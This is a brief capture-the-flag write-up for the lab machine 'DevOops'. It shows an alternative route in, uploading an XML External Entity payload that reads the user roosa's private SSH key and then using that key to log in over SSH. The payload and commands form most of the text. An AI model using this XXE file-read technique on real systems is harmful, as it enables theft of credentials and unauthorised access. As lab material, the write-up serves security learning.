# Alternative way to exploit DevOops

## Getting access to the box

There is another way to get access to the box as _roosa_ instead of exploiting the _Python pickle module_.

The **XML External Entity (XXE)** vulnerability can be used to read files on the box and we know the usernames from _/etc/passwd_.
Now assuming that this user perhaps has a private SSH key in _/home/roosa/.ssh/id_rsa_ and read that:
```markdown
POST /upload HTTP/1.1
(...)

Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///home/roosa/.ssh/id_rsa">
]>
<Test>
	<Author>&file;</Author>
	<Subject>Test</Subject>
	<Content>Test</Content>
</Test>
```

This can be copied and used to SSH directly into the box:
```markdown
chmod 600 roosa.key

ssh -i roosa.key roosa@10.10.10.91
```
